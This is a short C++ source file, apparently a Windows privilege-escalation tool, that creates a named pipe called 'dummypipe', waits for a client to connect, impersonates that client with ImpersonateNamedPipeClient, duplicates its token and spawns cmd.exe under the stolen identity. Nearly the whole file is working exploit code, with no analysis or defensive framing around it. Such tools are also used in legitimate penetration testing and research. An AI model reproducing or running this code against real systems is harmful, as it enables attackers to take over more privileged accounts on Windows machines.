// dummypipe.cpp : This file contains the 'main' function. Program execution begins and ends there.
// author: Ahmad Mahfouz @eln1x
#include <Windows.h>
#include <iostream>

#include <iostream>

const int MESSAGE_SIZE = 512;


int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\dummypipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"xxXXXx";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;
	STARTUPINFO *si = new STARTUPINFO();
	PROCESS_INFORMATION * pi = new PROCESS_INFORMATION();

	wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
	DWORD dwBytes = 0;
	BYTE bMessage[128] = { 0 };
	DWORD bytesRead = 1;
	HANDLE
		threadToken,
		duplicatedToken = NULL;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 2, 2048, 2048, 0, NULL);

	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;

	}


	if (!ReadFile(serverPipe, &bMessage, 1, &bytesRead, NULL)) {
		std::wcout << "ReadFileError:	" << GetLastError() << std::endl;

	}

	//if (!WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL)) {

	//	std::wcout << "WriteFileError:	" << GetLastError() << std::endl;

	//}

	std::wcout << "Impersonating the client..." << std::endl;
	if (!ImpersonateNamedPipeClient(serverPipe)) {
		std::wcout << "ImpersonateNamedPipeClientError:	" << GetLastError() << std::endl;

	}


	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &threadToken)) {
		std::wcout << "OpenThreadTokenErro:	" << GetLastError() << std::endl;

	}

	if (!DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicatedToken)) {
		std::wcout << "DuplicateTokenExError:	" << GetLastError() << std::endl;

	}

	
	if (!CreateProcessWithTokenW(duplicatedToken, 0, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, si, pi)) {
		std::wcout << "CreateProcessWithTokenWError:	" << GetLastError() << std::endl;

	}

	return 0;
}
